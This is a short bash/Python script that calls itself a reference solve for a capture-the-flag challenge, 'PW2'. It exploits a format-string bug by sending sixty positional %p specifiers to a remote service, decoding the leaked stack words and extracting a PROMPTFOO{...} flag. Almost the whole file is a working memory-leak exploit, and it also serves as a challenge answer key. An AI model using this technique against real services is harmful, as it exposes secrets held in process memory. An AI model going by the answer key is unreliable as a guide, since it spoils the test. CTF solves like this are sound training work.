#!/usr/bin/env bash
# Reference solve for PW2 (format-string leak). Send a run of positional `%p` conversions to dump
# stack words, decode each as little-endian ASCII, concatenate, and recover the flag bytes that
# sit in the same frame. Offset-agnostic: it scans a wide range rather than hard-coding a slot.
set -euo pipefail
HOST="${1:-target}"
PORT="${2:-8080}"

python3 - "$HOST" "$PORT" <<'PY'
import re
import sys
from pwn import remote

host, port = sys.argv[1], int(sys.argv[2])
io = remote(host, port)
io.recvuntil(b"format:")
# dump ~60 stack qwords; the flag buffer lives in this frame, so its bytes appear among them
io.sendline(b"|".join(b"%%%d$p" % i for i in range(1, 61)))
line = io.recvline(timeout=5).decode(errors="replace")
io.close()

out = bytearray()
for tok in line.split("|"):
    tok = tok.strip()
    if not tok.startswith("0x"):
        continue
    try:
        val = int(tok, 16)
    except ValueError:
        continue
    out += val.to_bytes(8, "little")  # each leaked qword -> its raw bytes
ascii_blob = out.decode("latin-1")
m = re.search(r"PROMPTFOO\{[^}]*\}", ascii_blob)
print(m.group(0) if m else "[!] flag not found in leak")
PY
